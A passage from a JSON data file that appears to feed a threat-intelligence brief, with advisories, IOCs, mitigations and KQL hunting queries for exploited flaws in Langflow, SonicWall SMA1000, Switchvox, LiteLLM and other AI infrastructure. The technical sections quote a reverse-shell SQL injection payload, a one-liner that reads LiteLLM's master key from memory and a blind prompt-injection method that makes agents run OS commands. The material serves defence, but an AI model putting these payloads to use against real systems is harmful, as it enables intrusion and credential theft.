   "Diff the token inventory. Export current tokens and compare against your issuance records; anything unaccounted for since Aug 28 should be revoked and treated as an intrusion artefact.",
   "If your Artifactory federates to an identity provider, review that side too — the enumeration watchTowr describes includes federated access topologies, which is reconnaissance for the next hop."
  ],
  "source": "JFrog security advisories, watchTowr (Yordan Ganchev, Attacker Eye), Yoav Landman (JFrog CTO), SecurityWeek",
  "sourceNote": "Sep 1–2, 2026"
 },
 "langflow": {
  "eyebrow": "Langflow · ≤ 1.4.2 · ZDI-26-034 · Exploited for credential harvesting",
  "title": "CVE-2026-0768: unauthenticated root code execution in Langflow's code validator, now used for secret theft",
  "tags": [
   [
    "crit",
    "Information Technology"
   ],
   [
    "high",
    "AI platform"
   ]
  ],
  "overview": "This is an eight-month-old public zero-day being picked up now, and the exploitation shape matters more than the CVE: attackers are not deploying malware, they are reading environment variables, secret keys and SSH material. Langflow instances typically hold API keys for model providers, vector databases and internal services, so a successful hit is a credential incident in whatever those keys reach, not an incident on the Langflow host. Root-level execution without authentication means there is no privilege step to detect. VulnCheck's wider count — eleven additional Langflow CVEs reported exploited in 2026, against one before 2026 — puts this in a pattern rather than treating it as an isolated bug.",
  "technical": [
   "CVE-2026-0768, CVSS 9.8: the code validator in Langflow's custom component editor uses a user-supplied string for Python code execution without proper validation. Exploitation requires no authentication and runs as root.",
   "Affected: all Langflow releases up to version 1.4.2.",
   "Disclosure timeline: reported through the Zero Day Initiative in July 2025, publicly disclosed as a zero-day in January 2026 as ZDI-26-034. In-the-wild exploitation reported by VulnCheck on Sep 1, 2026.",
   "Observed activity per VulnCheck: reconnaissance and credential harvesting — queries for environment variables, secret keys and SSH access — with traffic mainly originating from Russia.",
   "Volume: more than 360 exploitation attempts against VulnCheck canaries in the UK as of Monday, Aug 31, 2026.",
   "Wider Langflow targeting: VulnCheck states that before 2026 only one Langflow vulnerability was known exploited in the wild, and eleven more have since been targeted and reported as exploited.",
   "VulnCheck also reports more than 15,000 attacks successfully exploiting Langflow instances vulnerable to CVE-2026-0769, CVE-2025-3248 and CVE-2026-5027 — so an instance patched only against this CVE may still be reachable through the others."
  ],
  "iocs": [],
  "iocNote": "No indicator values have been published. VulnCheck's report describes attacker behaviour (environment-variable, secret-key and SSH queries) and a broad geographic origin, not addresses, hashes or domains, and the LinkedIn post it published carries no IOC list. Hunting therefore runs on process and file-access behaviour on the Langflow host plus egress from it, and on use of the secrets that host holds. Do not treat the Russian origin as a filter: it is a summary of observed traffic, not an indicator.",
  "mitigation": [
   "Upgrade Langflow past 1.4.2. If an upgrade cannot happen today, remove the instance from internet reachability — this flaw needs no credentials.",
   "Treat every secret reachable from the Langflow host as exposed: model-provider API keys, vector-database credentials, cloud role credentials in the environment, and any SSH private keys on the host. Rotate rather than review.",
   "Patch for CVE-2026-0769, CVE-2025-3248 and CVE-2026-5027 in the same change. VulnCheck reports 15,000-plus successful attacks against instances vulnerable to those three, so fixing only CVE-2026-0768 leaves the host reachable.",
   "Put Langflow behind authentication at the proxy layer and restrict which egress destinations it can reach; a component editor that can execute Python should not have open outbound internet access.",
   "Inventory where else in the AI stack the same pattern exists — self-hosted low-code AI tooling that executes user-supplied code is the exposure class here, not this product alone."
  ],
  "response": [
   "DEFENDER XDR KQL — Langflow host, Linux: the Python service spawning shells or reading secret material, which is what the reported credential harvesting looks like on the endpoint.\n\n// Langflow CVE-2026-0768 — post-exploitation: shell and secret access under the Langflow process\n// technique reference: github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, @0x534c)\nlet lookback = 30d;\nunion isfuzzy=true\n  (DeviceProcessEvents\n   | where Timestamp > ago(lookback)\n   | where InitiatingProcessFileName has_any (\"python\", \"python3\", \"uvicorn\", \"gunicorn\", \"langflow\")\n   | where FileName in~ (\"sh\",\"bash\",\"dash\",\"curl\",\"wget\",\"env\",\"printenv\",\"id\",\"whoami\",\"cat\",\"ssh\",\"ssh-keygen\",\"base64\")\n   | project Timestamp, DeviceName, AccountName, Signal = strcat(FileName, \" :: \", ProcessCommandLine)),\n  (DeviceFileEvents\n   | where Timestamp > ago(lookback)\n   | where InitiatingProcessFileName has_any (\"python\", \"python3\", \"uvicorn\", \"gunicorn\", \"langflow\")\n   | where FolderPath has_any (\"/.ssh\", \"/.env\", \"/etc/environment\", \"/proc/self/environ\", \"/root/\", \"/var/lib/langflow\")\n   | project Timestamp, DeviceName, AccountName = InitiatingProcessAccountName, Signal = strcat(ActionType, \" :: \", FolderPath))\n| sort by Timestamp desc",
   "DEFENDER XDR KQL — egress from the Langflow host, which is where harvested secrets leave. Any new destination for a host that should only talk to your model and database endpoints is worth a look.\n\n// Langflow host — unexpected outbound destinations after exploitation\nlet langflowHosts = dynamic([\"langflow-01\"]);  // <-- set to your hosts\nDeviceNetworkEvents\n| where Timestamp > ago(30d)\n| where DeviceName in~ (langflowHosts)\n| where isnotempty(RemoteUrl) or isnotempty(RemoteIP)\n| summarize hits = count(), first = min(Timestamp), last = max(Timestamp), ports = make_set(RemotePort, 20)\n    by DeviceName, Destination = coalesce(RemoteUrl, RemoteIP), InitiatingProcessFileName\n| order by first desc",
   "SENTINEL KQL — the identity half: use of the secrets Langflow holds. Correlate service-principal and API-key sign-ins from addresses that are not your infrastructure, enriched with Defender for Cloud Apps threat-intel IP tags.\n\n// Post-Langflow credential use — service identity sign-ins from tagged or unfamiliar IPs\n// enrichment pattern adapted from community work: github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, @0x534c)\nlet lookback = 30d;\nunion isfuzzy=true\n  (AADServicePrincipalSignInLogs\n   | where TimeGenerated > ago(lookback)\n   | where ResultType == 0\n   | project TimeGenerated, Identity = ServicePrincipalName, IPAddress, Source = \"SPN\"),\n  (CloudAppEvents\n   | where TimeGenerated > ago(lookback)\n   | extend raw = parse_json(tostring(RawEventData))\n   | extend IPAddress = tostring(raw.ClientIP)\n   | where IPTags has_any (\"Brute force attacker\", \"Password spray attacker\", \"malicious\", \"Possible Hackers\", \"Tor\")\n   | project TimeGenerated, Identity = AccountDisplayName, IPAddress, Source = \"CloudAppEvents\")\n| summarize events = count(), ips = make_set(IPAddress, 20), last = max(TimeGenerated) by Identity, Source\n| sort by last desc",
   "Rotate first, hunt second. The reported activity is secret theft, so the containment action that matters is invalidating the keys the instance held, not cleaning the host."
  ],
  "source": "VulnCheck (blog and LinkedIn), ZDI-26-034, NVD, SecurityWeek",
  "sourceNote": "Sep 1, 2026"
 },
 "sonicwallsma": {
  "eyebrow": "SonicWall · SMA1000 6210 / 7210 / 8200v · SNWLID-2026-0016 · Exploited in the wild",
  "title": "SMA1000 zero-days CVE-2026-83548 and CVE-2026-83549, found through the attacks that used them",
  "tags": [
   [
    "crit",
    "Information Technology"
   ],
   [
    "high",
    "All Sectors"
   ]
  ],
  "overview": "The important part of this advisory is how the flaws were found: SonicWall says both the vulnerabilities and their exploitation were discovered internally, which means the disclosure timeline starts after the attacks, not before them. The chain is the familiar appliance pattern — an unauthenticated flaw that reaches privileged internal functionality, paired with a post-authentication command-execution flaw that turns that reach into code on the box. Because a remote access gateway sits in front of the network and terminates sessions, compromise there is credential and session exposure, not just host exposure. No indicators have been published, so hunting has to run on appliance and network telemetry rather than known artefacts.",
  "technical": [
   "CVE-2026-83548, CVSS 10.0: pre-authentication server-side request forgery in the Appliance Work Place (AWP) interface. Per SonicWall, a remote unauthenticated attacker can reach sensitive functionality and conduct unauthorised operations.",
   "CVE-2026-83549, CVSS 7.8: OS command injection in the Appliance Management Console (AMC). An authenticated attacker can execute arbitrary OS commands, potentially resulting in remote code execution.",
   "SonicWall states it observed exploitation of both vulnerabilities. SecurityWeek notes this suggests the two were chained: the SSRF supplies the access that the AMC injection needs.",
   "Affected: SMA1000 series 6210, 7210 and 8200v. Not affected: SSL-VPN on SonicWall firewalls, and the SMA100 series.",
   "Fixed in hotfixes 12.4.3-03526 and 12.5.0-02952 and higher.",
   "Discovery: SonicWall says the vulnerabilities and their exploitation were both discovered internally. No victim count, actor attribution, or timeline for the attacks has been released.",
   "The public advisory includes no indicators of compromise. As of Sep 2, 2026 neither CVE was in the CISA KEV catalog, which held 17 SonicWall product entries.",
   "Context: SecurityWeek notes SonicWall product flaws are regularly exploited in the wild, including in ransomware attacks, and that some have been exploited for weeks before a patch existed.",
   "Rapid7 (Sep 2, 2026): CVE-2026-83548 is a pre-authentication SSRF in the SMA1000 Appliance Work Place interface; CVE-2026-83549 is an OS command injection in the Appliance Management Console that on its own requires an authenticated administrator and specific system conditions. Chained, they achieve unauthenticated RCE. Affected models: SMA1000 6210, 7210 and 8200v."
  ],
  "iocs": [],
  "iocNote": "No indicators of compromise have been published. SonicWall's advisory carries none, and there is no third-party incident reporting to draw from. Detection therefore depends on your own appliance telemetry: AMC administrative sessions and command execution, AWP requests that reach internal endpoints, and any new outbound connection initiated by the appliance itself. Because the vendor found the bugs by investigating live attacks, absence of published artefacts is not evidence of low prevalence.",
  "mitigation": [
   "Apply hotfix 12.4.3-03526 or 12.5.0-02952 (or later) to every SMA1000 6210, 7210 and 8200v now. There is no published workaround.",
   "Remove the Appliance Management Console from internet reachability. AMC is the second half of the chain and has no reason to be exposed.",
   "Treat any internet-facing SMA1000 that was unpatched as in scope for compromise review: check for AMC accounts, local admin additions, changed authentication or SSO settings, and unexpected files under the appliance's writable paths.",
   "Rotate credentials and revoke sessions for anything that authenticated through the gateway during the exposure window, including RADIUS/LDAP service accounts bound to the appliance.",
   "Where the appliance fronts internal applications, review those applications' logs for requests arriving with the gateway as source — that is what a successful SSRF looks like downstream.",
   "Rapid7's guidance: because exploitation was occurring before public disclosure, do not rely solely on patching to determine whether an appliance has already been compromised. Treat any exposed SMA1000 as requiring forensic review, not just a version check."
  ],
  "response": [
   "SENTINEL KQL — appliance-side hunting on forwarded SMA1000 syslog: AMC administrative activity and AWP requests to management paths. Adjust the DeviceVendor/Facility filters to match your connector.\n\n// SonicWall SMA1000 CVE-2026-83548 / CVE-2026-83549 — management-plane activity\n// union isfuzzy pattern so the query survives a missing connector\n// technique reference: github.com/Bert-JanP/Hunting-Queries-Detection-Rules (Bert-Jan Pals, kqlquery.com)\nlet lookback = 30d;\nunion isfuzzy=true\n  (CommonSecurityLog\n   | where TimeGenerated > ago(lookback)\n   | where DeviceVendor has \"SonicWall\"\n   | where RequestURL has_any (\"/cgi-bin/\", \"/__api__\", \"/appliance\", \"/amc\", \"/awp\")\n   | project TimeGenerated, SourceIP, DestinationIP, RequestURL, DeviceAction, Activity),\n  (Syslog\n   | where TimeGenerated > ago(lookback)\n   | where Computer has_any (\"sma\", \"sslvpn\", \"amc\")\n   | where SyslogMessage has_any (\"AMC\", \"appliance management\", \"shell\", \"exec\", \"sudo\", \"admin login\")\n   | project TimeGenerated, SourceIP = Computer, DestinationIP = \"\", RequestURL = \"\", DeviceAction = Facility, Activity = SyslogMessage)\n| sort by TimeGenerated desc",
   "DEFENDER XDR KQL — the downstream half: connections that originate from the gateway's own addresses toward internal services, which is how SSRF and post-exploitation traffic present on the inside. Replace the appliance address list with your own.\n\n// SMA1000 compromise — appliance-initiated internal traffic and inbound SSRF landings\nlet applianceIPs = dynamic([\"10.0.0.0\"]);  // <-- set to your SMA1000 addresses\nDeviceNetworkEvents\n| where Timestamp > ago(30d)\n| where RemoteIP in (applianceIPs)\n| summarize connections = count(), ports = make_set(LocalPort, 30), first = min(Timestamp), last = max(Timestamp)\n    by DeviceName, RemoteIP, ActionType\n| where connections > 0\n| sort by last desc",
   "Pull the AMC audit trail and account list off each appliance and diff it against your change records. A chained SSRF-plus-command-injection intrusion normally leaves an administrative artefact even when the file system is cleaned.",
   "Because SonicWall published no IOCs, record what you find. If your review produces artefacts, they are worth reporting to SonicWall PSIRT and to CISA's KEV nomination process — neither CVE is listed yet."
  ],
  "source": "SonicWall PSIRT advisory SNWLID-2026-0016, SecurityWeek",
  "sourceNote": "Sep 1–2, 2026"
 },
 "kevsep02": {
  "eyebrow": "CISA KEV · Seven additions · Sep 2, 2026 · BOD 26-04",
  "title": "Seven flaws added to KEV in one batch, four of them in AI and developer tooling",
  "tags": [
   [
    "crit",
    "All Sectors"
   ],
   [
    "high",
    "Federal deadlines Sep 5 and Sep 16, 2026"
   ]
  ],
  "overview": "The Sep 2 batch is unusual in composition rather than size. Two entries are perimeter appliances (SonicWall SMA1000), one is a VoIP platform (Switchvox), and the remaining four sit in the software and AI build chain: JFrog Artifactory, Starlette, Kestra OSS and LiteLLM. Three of the four AI/dev entries are carried as full stories elsewhere in this brief; this record exists to hold the deadlines and the batch-level reading.",
  "technical": [
   "CVE-2026-83548 (CVSS 10.0) — SonicWall SMA1000 server-side request forgery; remote unauthenticated access to sensitive functionality. Federal deadline Sep 5, 2026.",
   "CVE-2026-83549 (CVSS 7.8) — SonicWall SMA1000 post-authentication OS command injection reaching RCE as administrator. Federal deadline Sep 5, 2026.",
   "CVE-2026-9586 (CVSS 9.3) — Sangoma Switchvox unauthenticated SQL injection; arbitrary SQL against the backend PostgreSQL database from a single crafted request, including RCE. Federal deadline Sep 5, 2026.",
   "CVE-2026-82329 (CVSS 9.8) — JFrog Artifactory improper authentication; under default configuration an unauthenticated attacker with network access obtains administrative privileges. Federal deadline Sep 5, 2026.",
   "CVE-2026-48710 (CVSS 6.5) — Kludex Starlette HTTP request/response smuggling; paths injected into the host part prepend the actual path, giving authentication bypass where authentication depends on the reconstructed URL path. Federal deadline Sep 16, 2026.",
   "CVE-2026-49869 (CVSS 10.0) — Kestra OSS OS command injection; an unauthenticated remote attacker can create and execute arbitrary workflows without credentials. Federal deadline Sep 5, 2026.",
   "CVE-2026-59822 (CVSS 8.8) — Berri LiteLLM MCP Streamable HTTP endpoint improper authentication; an unauthenticated attacker establishes an authenticated MCP session using an arbitrary Bearer token. Federal deadline Sep 16, 2026.",
   "Microsoft's report is the stated basis for the Kestra listing: likely exploitation in late June 2026 to establish a reverse shell, conduct Docker container environment discovery, perform defence evasion, deploy a cryptocurrency miner and facilitate data harvesting. Microsoft describes four impact paths — shell execution through the workflow engine, container-environment exposure through Docker socket access, host resource hijacking through miner deployment, and follow-on collection through workflow task execution — and notes a later curl-pipe-shell event that encoded collected output and stored it through Kestra's own key-value interface, reducing reliance on standalone file artefacts.",
   "Wiz reports exploitation of CVE-2026-59822 against its honeypots to probe model enumeration endpoints, and links Qilin ransomware actors to the CVE-2026-42271 plus CVE-2026-48710 chain."
  ],
  "iocs": [],
  "iocNote": "No indicators accompany a KEV listing. Product-specific indicators for the entries in this batch are held in the SonicWall SMA1000 (none published), Sangoma Switchvox, JFrog Artifactory and AI infrastructure records in this brief.",
  "mitigation": [
   "Treat Sep 5, 2026 as the working deadline for SonicWall SMA1000, Switchvox, Artifactory and Kestra, and Sep 16 for Starlette and LiteLLM, whether or not you are an FCEB agency.",
   "Starlette is a dependency, not a product: inventory it through the ASGI applications that ship it rather than by asset name. Update Starlette to 1.0.1 or later; LiteLLM to 1.83.7 or later.",
   "Kestra OSS: take the workflow engine off the internet and remove Docker socket access from the engine container. An unauthenticated workflow-creation path with a mounted Docker socket is host compromise.",
   "Where patching is not immediate on LiteLLM, block POST /mcp-rest/test/connection and POST /mcp-rest/test/tools/list at the reverse proxy or API gateway, restrict network access to trusted segments, and rotate credentials stored by the proxy."
  ],
  "response": [
   "This is a catalog and deadline record. Hunting queries for the individual products in the batch live in the Sangoma Switchvox, JFrog Artifactory, PaperCut and AI infrastructure records rather than being duplicated here.",
   "DEFENDER XDR KQL — the useful query for a KEV batch is not indicator hunting, it is exposure reconciliation against the deadline. Vulnerability-management technique adapted from community work: github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, LinkedIn @0x534c).\n\n// CISA KEV batch of Sep 2, 2026 — exposed instances and deadline status\nlet batch = datatable(Cve:string, Product:string, Due:datetime)\n[\n  \"CVE-2026-83548\", \"SonicWall SMA1000\",      datetime(2026-09-05),\n  \"CVE-2026-83549\", \"SonicWall SMA1000\",      datetime(2026-09-05),\n  \"CVE-2026-9586\",  \"Sangoma Switchvox\",      datetime(2026-09-05),\n  \"CVE-2026-82329\", \"JFrog Artifactory\",      datetime(2026-09-05),\n  \"CVE-2026-49869\", \"Kestra OSS\",             datetime(2026-09-05),\n  \"CVE-2026-48710\", \"Kludex Starlette\",       datetime(2026-09-16),\n  \"CVE-2026-59822\", \"Berri LiteLLM\",          datetime(2026-09-16)\n];\nDeviceTvmSoftwareVulnerabilities\n| where CveId in~ (batch | project Cve)\n| join kind=inner (batch | project CveId = Cve, Product, Due) on CveId\n| summarize Devices = dcount(DeviceId), Hosts = make_set(DeviceName, 15),\n            Versions = make_set(SoftwareVersion, 10)\n    by CveId, Product, Due, SoftwareName, RecommendedSecurityUpdate\n| extend DaysToDeadline = datetime_diff(\"day\", Due, now()), Overdue = now() > Due\n| sort by Overdue desc, Due asc, Devices desc",
   "SENTINEL KQL — three of the seven products sit outside the CMDB, so pair the vulnerability view with a discovery pass over what is actually listening, using inventory rather than a CVE list.\n\n// Discovery pass for engineering-owned products in the Sep 2 KEV batch\nlet names = dynamic([\"starlette\",\"uvicorn\",\"litellm\",\"kestra\",\"artifactory\"]);\nunion isfuzzy=true\n  (DeviceTvmSoftwareInventory\n   | where SoftwareName has_any (names) or SoftwareVendor has_any (dynamic([\"berri\",\"kludex\",\"jfrog\",\"kestra\"]))\n   | project Host = DeviceName, Leg = \"software inventory\", Evidence = strcat(SoftwareVendor, \" \", SoftwareName, \" \", SoftwareVersion)),\n  (DeviceProcessEvents\n   | where TimeGenerated > ago(30d)\n   | where ProcessCommandLine has_any (names)\n   | project Host = DeviceName, Leg = \"process observed\", Evidence = ProcessCommandLine),\n  (DeviceNetworkEvents\n   | where TimeGenerated > ago(30d)\n   | where InitiatingProcessCommandLine has_any (names)\n   | where LocalPort in (4000, 8000, 8080, 8081, 8082)\n   | project Host = DeviceName, Leg = \"listening service\", Evidence = strcat(InitiatingProcessFileName, \" :\", LocalPort))\n| summarize Sightings = count(), Detail = make_set(Evidence, 8) by Host, Leg\n| sort by Host asc",
   "Reconcile the batch against your own exposure inventory before the Sep 5 deadline rather than against asset criticality tiers — three of these products (Starlette, Kestra, LiteLLM) are typically owned by engineering rather than by IT operations and often sit outside the CMDB."
  ],
  "source": "CISA KEV catalog (Sep 2, 2026), The Hacker News, Microsoft Security Blog, Wiz Threat Research",
  "sourceNote": "Sep 2–3, 2026"
 },
 "switchvox": {
  "eyebrow": "Sangoma Switchvox · CVE-2026-9586 · CVSS 9.3 · Exploited from Aug 30, 2026",
  "title": "Unauthenticated SQL injection on /pa gives PostgreSQL superuser RCE; reverse shells observed from a single source IP",
  "tags": [
   [
    "crit",
    "Communications"
   ],
   [
    "high",
    "Patched Jul 14, exploited Aug 30"
   ]
  ],
  "overview": "A six-week gap between the patch and first observed exploitation, caught by honeypots deployed before the fix shipped. The vulnerability is a textbook unparameterised concatenation into a PostgreSQL query on an endpoint that was never meant to be authenticated, and PostgreSQL's COPY ... TO PROGRAM converts SQL execution into command execution directly. Horizon3's assessment is that most internet-exposed Switchvox systems have either already been targeted or will be.",
  "technical": [
   "Affected: Sangoma Switchvox SMB Edition 8.3 (build 104997) and earlier. Fixed in Switchvox 8.4.0.2, released Jul 14, 2026.",
   "The /pa endpoint, handled by PhoneAppsHandler.pm, is exposed without authentication and parses XML beginning with <PolycomIPPhone>. The user-controlled PhoneIP field is concatenated directly into a PostgreSQL query with no sanitisation or parameterisation.",
   "Horizon3 published an example of the injected statement recorded in the appliance log: SELECT proposed_extension FROM auto_phone_config WHERE ip_address = '10.0.0.1'; COPY (SELECT '') TO PROGRAM 'nc 10.0.18.42 4444 -e /bin/bash > /tmp/0d012120ab00297d.txt 2>&1; chmod 644 /tmp/0d012120ab00297d.txt'--' AND config_state = 'configured'. The 10.0.18.42 address in that excerpt is Horizon3's own test listener, not an attacker asset.",
   "Timeline: Apr 10, 2026 — Horizon3 reports 12 distinct Switchvox vulnerabilities to Sangoma. May 8 — Horizon3 and Defused Cyber deploy internet honeypots mimicking Switchvox, before fixes exist. May 11 — SRA independently reports issues. Jul 14 — Sangoma releases 8.4.0.2. Aug 30 — the honeypot tripwire fires.",
   "Observed activity: exploitation attempts from a single IP address, dropping a reverse shell and then running Base64-encoded commands to enumerate running processes. Help Net Security reports later second-stage malware deployment, possibly a cryptominer.",
   "SRA Labs demonstrated a further impact path: exfiltration of the cookie signing key to an external server, which allows an attacker to forge authentication material for arbitrary users. Rotating that key is therefore part of recovery, not optional hardening.",
   "Horizon3 says it has not observed exploitation of the other 11 reported flaws. Zach Hanley noted that with LLM-assisted vulnerability discovery, duplicate findings are expected to become the norm, making visibility into when a finding becomes known and exploited more valuable.",
   "Added to CISA KEV on Sep 2, 2026 with a federal remediation deadline of Sep 5, 2026."
  ],
  "iocs": [
   {
    "type": "IP",
    "value": "176.65.148.184",
    "note": "Sole observed exploitation source against the Horizon3/Defused Cyber Switchvox honeypots from Aug 30, 2026"
   },
   {
    "type": "Behavior",
    "value": "Outbound connection from a Switchvox appliance on TCP/39323",
    "note": "Reverse-shell callback port reported by BleepingComputer alongside the attacker IP"
   },
   {
    "type": "Filename",
    "value": "/var/log/switchvox/db-quirks.log",
    "note": "On devices with SSH access enabled, the SQL injection payload is recorded here; review for injected statements"
   },
   {
    "type": "String",
    "value": "COPY (SELECT '') TO PROGRAM",
    "note": "PostgreSQL construct in the injected statement that converts SQL execution into command execution; search db-quirks.log for it"
   },
   {
    "type": "String",
    "value": "<PolycomIPPhone>",
    "note": "XML prefix parsed by the /pa endpoint; unexpected /pa requests carrying it from untrusted sources are the exploitation attempt"
   }
  ],
  "iocNote": "Horizon3 published a small, high-confidence indicator set: one attacker IP, one log file, and the payload shape. No hashes were published, so no SHA256 is available for the second-stage binary. The /tmp/0d012120ab00297d.txt filename in Horizon3's excerpt is from their own test payload and should not be treated as an attacker artefact.",
  "mitigation": [
   "Upgrade to Switchvox 8.4.0.2 or later. If that cannot be done immediately, restrict network access to the Switchvox web interfaces and specifically to the /pa endpoint.",
   "Take Switchvox management off the public internet. Horizon3's position is that exposed instances have been or will be targeted.",
   "Review /var/log/switchvox/db-quirks.log for injected SQL, and firewall and proxy logs for 176.65.148.184 and for outbound connections on TCP/39323.",
   "If compromise is suspected, rotate the cookie signing key — SRA Labs showed it can be exfiltrated, and it lets an attacker forge authentication material for arbitrary users. Rebuild the appliance rather than cleaning it; a PostgreSQL superuser shell is full control of the host.",
   "Check for cryptominer processes and unexpected outbound mining-pool traffic; second-stage staging has been reported."
  ],
  "response": [
   "DEFENDER XDR KQL — outbound contact with the published attacker IP and the reverse-shell port from any device, which is the one signal available where the appliance itself sends no telemetry.\n\n// Switchvox CVE-2026-9586 — attacker infrastructure and reverse-shell callback\n// IPTags enrichment pattern adapted from community work: github.com/Bert-JanP/Hunting-Queries-Detection-Rules (Bert-Jan Pals, kqlquery.com)\nlet switchvoxIPs = dynamic([\"176.65.148.184\"]);\nDeviceNetworkEvents\n| where Timestamp > ago(30d)\n| where RemoteIP in (switchvoxIPs) or LocalIP in (switchvoxIPs) or RemotePort == 39323\n| project Timestamp, DeviceName, ActionType, LocalIP, RemoteIP, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine\n| sort by Timestamp desc",
   "SENTINEL KQL — the same indicators across network and firewall connectors, written with union isfuzzy so it still runs where a connector is absent.\n\n// Switchvox CVE-2026-9586 — perimeter view of exploitation and callback\nlet lookback = 30d;\nlet switchvoxIPs = dynamic([\"176.65.148.184\"]);\nlet callbackPort = 39323;\nunion isfuzzy=true\n  (CommonSecurityLog\n   | where TimeGenerated > ago(lookback)\n   | where SourceIP in (switchvoxIPs) or DestinationIP in (switchvoxIPs) or DestinationPort == callbackPort\n   | project TimeGenerated, Source = \"CommonSecurityLog\", Src = SourceIP, Dst = DestinationIP, Port = DestinationPort, Extra = RequestURL),\n  (AzureDiagnostics\n   | where TimeGenerated > ago(lookback)\n   | where Category has \"Firewall\"\n   | where msg_s has_any (switchvoxIPs) or msg_s has tostring(callbackPort)\n   | project TimeGenerated, Source = \"AzureDiagnostics\", Src = \"\", Dst = \"\", Port = callbackPort, Extra = msg_s),\n  (DeviceNetworkEvents\n   | where Timestamp > ago(lookback)\n   | where RemoteIP in (switchvoxIPs) or RemotePort == callbackPort\n   | project TimeGenerated = Timestamp, Source = \"DeviceNetworkEvents\", Src = LocalIP, Dst = RemoteIP, Port = RemotePort, Extra = InitiatingProcessCommandLine)\n| sort by TimeGenerated desc",
   "SENTINEL KQL — appliance log review where Switchvox syslog is forwarded, looking for the injection shape rather than a fixed payload.\n\n// Switchvox CVE-2026-9586 — injected SQL in db-quirks.log\nSyslog\n| where TimeGenerated > ago(30d)\n| where SyslogMessage has_any (\"db-quirks\", \"auto_phone_config\")\n| where SyslogMessage has_any (\"TO PROGRAM\", \"COPY (SELECT\", \"pg_read_file\", \"COPY (SELECT '')\")\n| project TimeGenerated, Computer, Facility, SeverityLevel, SyslogMessage\n| sort by TimeGenerated desc",
   "Where Switchvox logs are not centralised, pull /var/log/switchvox/db-quirks.log off each appliance by hand before rebuilding. The log is the only place the payload is recorded."
  ],
  "source": "Horizon3.ai (Zach Hanley) disclosure, Defused Cyber, SRA Labs, BleepingComputer, Help Net Security, The Hacker News, CISA KEV",
  "sourceNote": "Sep 1–3, 2026"
 },
 "aiinfra": {
  "eyebrow": "Self-hosted AI infrastructure · Wiz 90-day honeypot telemetry · Microsoft AI gateway report",
  "title": "MCP command injection, blind prompt injection and credentials read out of process memory",
  "tags": [
   [
    "crit",
    "Information Technology"
   ],
   [
    "high",
    "Credential theft · Cryptomining · Qilin link"
   ]
  ],
  "overview": "Two independent bodies of telemetry, published a day apart, describe the same shift: attackers now treat AI gateways and agent frameworks as credential concentrators rather than as web apps. Wiz's framing is that a LiteLLM proxy can hold keys for every model provider it routes to, may run with cloud IAM permissions, and connects to internal services through MCP tool servers, so one compromise reaches everything downstream. The tooling observed is adapted to each product's internals — this is not commodity scanning.",
  "technical": [
   "Pattern 1, MCP exploitation. CVE-2026-59822 (Wiz-discovered) sits in LiteLLM's OAuth2 header handling: when token validation fails the server returns an empty UserAPIKeyAuth() object with no restrictions rather than rejecting the request. Any Bearer token, including a single character, grants full MCP access. Observed requests: GET /v1/models with Authorization: Bearer x.",
   "CVE-2026-42271 passes the command field of an MCP server test configuration directly to subprocess execution with no allowlist or admin gate. Attackers submitted a fake stdio server config whose command was a Python script that fetched a zip from an attacker host, extracted a miner to /tmp/.dbus-cache/, launched it with start_new_session=True, then removed the staging directory with rmtree while the running process kept the binary's inode open — and returned a valid MCP handshake so the connection test appeared to succeed. Command output was returned through the MCP protocol itself, embedded in the description field of a fake tool in the tools/list response.",
   "Chaining: CVE-2026-42271 with the Starlette host-header bypass CVE-2026-48710 gives fully unauthenticated RCE. Wiz states that external researchers have linked the Qilin ransomware group to active exploitation of this chain.",
   "Pattern 2, blind prompt injection against LangChain, Flowise, OpenWebUI and Node-RED. Injected prompts instruct the agent to run an OS command; if the agent has a shell tool, a DNS query fires to an attacker-controlled OAST callback domain with the victim IP encoded in the subdomain and a per-session random string, confirming execution without surfacing output. Wiz notes the natural-language prompt itself was not captured and the example it publishes is a reconstruction consistent with the observed process tree, not a captured payload. Payloads are then fetched from Pastebin rather than sent inline, Base64-encoded to defeat prompt-level filtering, ending in XMRig at /usr/src/node-red/xmrig — a path chosen to blend into the Node.js process tree.",
   "Pattern 3, AI-native post-exploitation. On LiteLLM the master key does not exist on disk, so attackers queried the running Python module state directly: python3 -c \"import litellm; print(getattr(litellm,'api_key',None)); import litellm.proxy.proxy_server as ps; print(getattr(ps,'master_key',None)); print(getattr(ps,'litellm_master_key_hash',None))\". The same sessions enumerated /app/litellm_config.yaml, /etc/litellm/.env and ~/.litellm/config.yaml.",
   "Backend fingerprinting: on instances still running the default master key sk-1234, attackers posted to /chat/completions asking the model to output only its own name, to decide between stealing the key, abusing inference quota (LLMjacking) or moving on.",
   "Camouflage: on the Langflow honeypot the miner was staged at /app/data/.claude/ and renamed unicorn — a directory that blends in because Claude Code writes it on any host where it runs.",
   "Microsoft's parallel report describes LiteLLM gateways broken into via CVE-2026-42271 and CVE-2026-48710 to deliver an XMRig miner as an ELF binary, after fingerprinting the host and terminating competing mining processes. The attackers then reused collected database information to reach the LiteLLM-backed PostgreSQL tier and query LiteLLM_ProxyModelTable and LiteLLM_VerificationToken for model configuration, upstream provider key material, provider endpoints and proxy-issued virtual keys. Persistence is through ~/.ssh/authorized_keys modification.",
   "Microsoft additionally suspects exploitation of exposed RAGFlow instances via CVE-2026-45312, CVE-2026-28797, CVE-2026-24770, CVE-2025-68700 and CVE-2025-69286 to establish persistence and steal LLM provider keys and related metadata. Its conclusion: monitor AI workloads according to their control-plane role, not only as isolated applications.",
   "Scale context from Wiz's State of AI in the Cloud 2026: 90% of cloud environments run self-hosted AI software, 81% run managed AI services, 63% self-host models. Wiz also notes most AI tools ship unauthenticated — Marimo, Flowise, Langflow, Ollama, ChromaDB, Milvus among them."
  ],
  "iocs": [
   {
    "type": "IP",
    "value": "185.62.1[.]8",
    "note": "Malware download server, LiteLLM/MCP campaign (Wiz)"
   },
   {
    "type": "IP",
    "value": "185.84.98[.]85",
    "note": "Cryptominer command and control (Wiz)"
   },
   {
    "type": "IP",
    "value": "94.26.106[.]29",
    "note": "Langflow binary staging (Wiz)"
   },
   {
    "type": "Domain",
    "value": "pool.hashvault[.]pro",
    "note": "Monero mining pool used across multiple campaigns (Wiz)"
   },
   {
    "type": "Domain",
    "value": "crazyeltonproxy[.]top",
    "note": "Monero mining proxy, LangChain and Node-RED campaigns (Wiz)"
   },
   {
    "type": "Domain",
    "value": "1710.rwlp.be",
